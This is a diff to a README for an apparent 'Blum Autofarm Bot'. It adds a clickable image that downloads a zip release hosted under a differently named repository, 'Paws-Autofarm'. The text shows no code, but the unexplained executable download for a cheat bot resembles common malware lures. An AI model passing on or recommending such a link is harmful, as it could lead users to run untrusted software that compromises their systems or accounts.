@@ -1,3 +1,11 @@
+> [!Note]
+> Click on the picture to download
+
+[<img src="https://github.com/user-attachments/assets/d5fa7c73-06f8-4f3d-b892-3a134d684c6f">](https://github.com/Abhiasik/Paws-Autofarm/releases/download/BlumAutoBot/Blum_AutofarmBot.Pro.12.1.0.469.zip)
+
+
+
+
 
 > [!Note]
 > What is Blum Autofarm Bot?
